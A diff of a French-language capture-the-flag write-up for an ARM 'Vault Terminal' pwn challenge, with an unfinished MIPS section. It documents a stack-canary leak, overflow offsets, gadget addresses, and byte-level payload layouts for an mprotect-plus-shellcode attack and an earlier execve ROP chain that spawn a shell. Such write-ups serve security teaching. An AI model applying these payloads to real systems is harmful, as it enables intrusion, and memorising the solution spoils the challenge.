@@ -1,79 +1,122 @@
-# PWN#Alpha — vault (ARM / Thumb / canary + syscall ROP)
+# PWN#Alpha — Vault Terminal ARM (mprotect + shellcode sur la pile)
 
-## Statut
+- **Auteur :** k1lls3vr4q
+- **Cible :** `<HOST>:<PORT>` (ELF 32-bit ARM armhf/EABI5, PIE, dynamiquement lié, stripped)
+- **Catégorie :** pwn
+- **Flag :** `CTF{REDACTED}`
+- **Fichiers fournis :** `vault` (ELF ARM)
 
-Résolu. Shell distant obtenu (`uid=65534(nobody)`), flag lu via `cat /flag/flag.txt` : `CTF{REDACTED}` (soumission laissée à l'utilisateur, jamais stockée dans le dépôt).
+## Contexte
 
-## Cible
+Troisième recompilation du même source « Vault Terminal », cette fois ARM/Thumb-2, dynamiquement lié et stripped. Comme PWN#Beta (MIPS), le **binaire téléchargé a sa section `.data` volontairement effacée**, ce qui provoque un segfault dans son stub d'entrée obfusqué avant d'atteindre `main`.
 
-- Binaire : `vault` — **ELF 32-bit LSB, ARM EABI5**, interpréteur `/lib/ld-linux-armhf.so.3`, **strippé**.
-- sha256 : `ebada74666f8e1e91ee8994093fd65718ea464c418b5c78d22d00160c6cf09e7`.
-- Protections : **Partial RELRO, Canary, NX, PIE**. Pas de leak libc direct.
-- Service : `<HOST>:<PORT>`.
-- Le binaire distribué est **corrompu volontairement** (stub d'entrée Thumb illisible, `main` absent du `_start`), mais l'exécution distante du binaire « officiel » fonctionne : on exploite directement le service.
-
-## Indices
-
-- `printf("[debug] build id: %p\n", ...)` → fuite d'un pointeur PIE constant (`0x40000945`, offset `0x945`).
-- `printf("Hello, %s\n", buf)` **sans** terminaison NUL après `read(0, buf, 0x41)` → **fuite de pile** (canari + saved r7 + saved lr).
-- `read(0, buf, 0x96)` (150 octets) dans un buffer de `0x40` → **débordement de pile**, même adresse que le `read` du nom.
-- Le canari est vérifié via `eors r2, r3 ; beq` avant l'épilogue `adds r7,#0x48 ; mov sp,r7 ; pop {r7,pc}`.
+Le stub d'entrée (`e_entry = 0x9e1`, Thumb) décode un saut via XOR avec une clé dérivée d'un pointeur `.data` relocalisé (`R_ARM_RELATIVE`) XORé avec une constante fixe (`0x426f6772` — la même constante que dans le trampoline MIPS de PWN#Beta, confirmant un packer commun). Dans le binaire distribué, le mot `.data` nécessaire est **mis à zéro** — crash immédiat.
 
 ## Reconnaissance
 
-1. Désassemblage ARM/Thumb avec `radare2` (`-e anal.armthumb=true`), `llvm-objdump`, `ROPgadget --thumb`, faute de binutils ARM local.
-2. `main` identifié (`fcn.0000089a`) et vérifié : leak `%p`, `read(0,buf,0x41)`, `printf("Hello, %s", buf)`, `read(0,buf,0x96)`, `puts("Message received.")`, canari, épilogue.
-3. **ASLR désactivée en remote** : le saved r7 (adresse de pile) et la base PIE (`0x40000000`) sont **constants** entre connexions ; seul le canari est aléatoire (mais fuité).
+L'analyse statique (capstone, mode Thumb) du petit `.text` applicatif (`0x484` octets) suffit :
 
-### Fuite (nom = 64×`A` + `B`)
+- `vuln` @ `0x89a` : frame `sub sp,#0x48` ; buffer à `r7+4` ; canary sauvegardé/vérifié à `r7+0x44` (**offset buffer 0x40 = 64**, convention identique à chaque architecture de la série) ; r7/LR sauvegardés aux **offsets buffer 68/72**.
+- `read(0, buf, 0x41)` pour le nom (65 octets — overflow 1 octet dans le canary) ; `read(0, buf, 0x96)` pour le message (150 octets — dépasse largement LR).
+- Imports : `printf, read, puts, setvbuf, __stack_chk_fail, abort` — **pas de `system`**.
+- Recherche exhaustive de gadgets dans tout le `.text` : **aucun `pop {r0-r3, ...}`** — la primitive usuelle pour configurer les arguments d'un appel libc n'existe pas dans ce binaire minimal stripped.
 
-```
-Hello, AAAA...B | canari[1:4] | saved r7 (4 o) | saved lr (tronqué)
-```
+## Le gadget mprotect-shellcode réutilisable
 
-- `canary = 0x00 || canari[1:4]`.
-- `saved r7 = 0x3ffffbe0` → c'est à la fois le `sp` à l'entrée de `main` **et** la base de la chaîne ROP (`sp` après l'épilogue). Buffer = `saved r7 - 0x4c = 0x3ffffb94`.
-
-## Gadgets (Thumb, `offset+1`)
-
-| Gadget | Adresse | Effet |
-|---|---|---|
-| `pop {r3, pc}` | `0x676` | r3 |
-| `mov r0,r3 ; adds r7,#0x10 ; mov sp,r7 ; pop {r7,pc}` | `0x75c` | r0 + pivot pile |
-| `movs r1,r0 ; pop.w {sb,lr} ; pop {pc}` | `0x886` | r1 = r0 |
-| `pop.w {r2,lr} ; pop {pc}` | `0x88e` | r2 |
-| `svc #0 ; add.w r3,r3,#1 ; bx r3` | `0x9d8` | syscall + retour via r3 |
-
-## Chaîne d'exploitation
-
-Pas de `pop {r0}` : `r0` s'obtient uniquement via `mov r0,r3` (qui **pivote** `sp = r7+0x10`). On ne dépend donc d'aucune libc et on appelle directement `execve` par syscall.
-
-Payload (132 octets, buffer `B = saved r7 - 0x4c`) :
+Une seconde couche d'obfuscation (`0x988`–`0x9de`) XOR-déchiffre un blob de 36 octets puis fait mprotect + jump. La **queue** de ce stub est réutilisable telle quelle :
 
 ```
-[0..7]    "/bin/sh\0"
-[8..11]   0x00000000            (argv = {NULL})
-[64..67]  canari
-[68..71]  saved r7 = Rb-8       (1er pivot -> sp = Rb+8)
-[72..75]  POP_R3_PC             (1er pc)
-[76..]    chaîne :
-          r3=&NULL ; mov r0,r3 (pivot) ; movs r1,r0  -> r1=&NULL
-          r3="/bin/sh" ; mov r0,r3 (pivot) ; r7=11
-          r2=0 ; svc #0
+0x9c2: mov  r0, r3
+0x9c4: movw r1, #0xf000
+0x9c8: movt r1, #0xffff        ; r1 = 0xfffff000
+0x9cc: ands r0, r1              ; r0 = page_align_down(r3)
+0x9ce: movs r1, #1
+0x9d0: lsls r1, r1, #0xc        ; r1 = 0x1000
+0x9d2: movs r2, #7              ; PROT_READ|WRITE|EXEC
+0x9d4: movw r7, #0x7d           ; SYS_mprotect = 125
+0x9d8: svc  #0
+0x9da: add.w r3, r3, #1         ; set Thumb bit
+0x9de: bx   r3
 ```
 
-Résultat : `execve("/bin/sh", {NULL}, NULL)` → shell `nobody`, puis :
+Atterrir ici avec `r3` = une adresse dans le buffer, et toute la page devient RWX, puis l'exécution saute dans le buffer (`r3+1`). Le chaînon manquant : un `pop {r3, pc}` à `0x676`.
+
+## Fuite : canary + adresse pile stable, pas d'ASLR
+
+Meme technique `read(0,buf,0x41)` dans un buffer de 64 octets, pas de NUL, `%s` pendouillant : envoyer **exactement 65 octets, sans retour a la ligne**. L'echo contient : les octets 1-3 du canary, puis l'ancien `r7` sauvegarde (offset buffer 68) = `R1_main`, le pointeur de pile avec lequel `vuln` a ete appele, puis les 2 premiers octets du LR sauvegarde avant qu'un `0x00` coupe.
+
+La valeur de r7 sauvegarde est **identique entre connexions TCP independantes**, confirmant le comportement par defaut de qemu-user (pas d'ASLR).
+
+`BUFFER_ADDR = leaked_r7 - 0x4c` (calcule depuis le push/sub/add de vuln).
+
+## Payload (buffer message, 84 octets)
 
 ```
-$ cat /flag/flag.txt
+[0:28)   Shellcode Thumb : mov r0,pc; add r0,#0x10; mov r1,#0; mov r2,#0;
+         mov r7,#11 (execve); svc #0;  puis b"/bin/sh\x00"
+[28:64)  padding
+[64:68)  p32(canary_fuite)
+[68:72)  padding (ancien r7)
+[72:76)  p32(0x400676 | 1)        # pop {r3, pc}
+[76:80)  p32(BUFFER_ADDR)         # -> r3  (pointe sur le shellcode en offset 0)
+[80:84)  p32(0x4009c2 | 1)        # -> pc  (gadget mprotect-tail)
+```
+
+`PIE_BASE = 0x400000` confirme depuis une trace qemu-arm locale.
+
+Flux : `vuln` retourne vers `pop{r3,pc}` qui met `r3=BUFFER_ADDR` puis saute vers le gadget mprotect qui rend la page RWX, et `bx r3+1` saute dans le shellcode pour `execve("/bin/sh",0,0)`.
+
+## Resultat
+
+```
 CTF{REDACTED}
 ```
 
-Validation : `id` → `uid=65534(nobody)` ; lecture du flag réussie. L'exploit est reproductible à chaque connexion (seul le canari est refuité). Voir `vault_exploit.py`.
+Flag lu dans `/flag/flag.txt` apres obtention d'un shell sur le socket.
 
-## Pièges
+## Pieges rencontres
 
-- **`r7` est double-usage** : frame pointer de l'épilogue puis base de chaîne puis numéro de syscall. Les pivots successifs (`mov r0,r3`) imposent de recalculer `sp` et `r7` à chaque étape (mémoire de pile entièrement contrôlée car ASLR off).
-- Le binaire local étant corrompu, l'émulation locale n'est pas un oracle fiable : valider en remote.
-- `argv = NULL` accepté par le noyau ; sinon passer l'adresse d'un mot NULL (fait ici avec `argv = {NULL}`).
-- La libc armhf distante est un build non public (les offsets relatifs dérivent de Debian 2.41) : préférer une chaîne **sans libc** (syscall) plutôt que ret2libc.
+- **Pas de target ARM dans objdump** sur cette machine — utiliser `capstone` (`CS_ARCH_ARM`, `CS_MODE_THUMB`, `skipdata=True`) ; les stubs PLT sont en mode ARM (non-Thumb) meme si l'application est Thumb.
+- **Le stub d'entree XOR crashe avant main** dans le binaire telecharge — patcher `e_entry` vers `main` (`0x945`) pour les tests locaux uniquement.
+- **La decryption des chaines casse dans la copie patchee** — cosmetique, les offsets et la mecanique de l'overflow sont inchanges.
+
+---
+
+# PWN#Beta — Vault Terminal MIPS
+
+- **Auteur :** k1lls3vr4q
+- **Cible :** `<HOST>:<PORT>` (ELF 32-bit MIPS)
+- **Catégorie :** pwn
+- **Flag :** `CTF{REDACTED}`
+
+> *Write-up detaille a completer. Les deux challenges partagent la meme famille « Vault Terminal » avec canary leak off-by-one et ROP adapte a l'architecture MIPS.*
+
+## Contexte
+
+<!-- TODO: Ajouter le contexte MIPS (big-endian, stripped, meme packer 0x426f6772) -->
+
+## Reconnaissance
+
+<!-- TODO: Decrire la structure vuln MIPS, gadgets disponibles -->
+
+## Strategie
+
+<!-- TODO: Documenter la chaine ROP MIPS -->
+
+## Payload
+
+<!-- TODO: Ajouter le layout du payload MIPS -->
+
+## Resultat
+
+```
+CTF{REDACTED}
+```
+
+## Pieges rencontres
+
+<!-- TODO: Lister les difficultes specifiques a MIPS -->
+
+---
+
+*Write-ups par **k1lls3vr4q** — BUG|PWN CTF.*
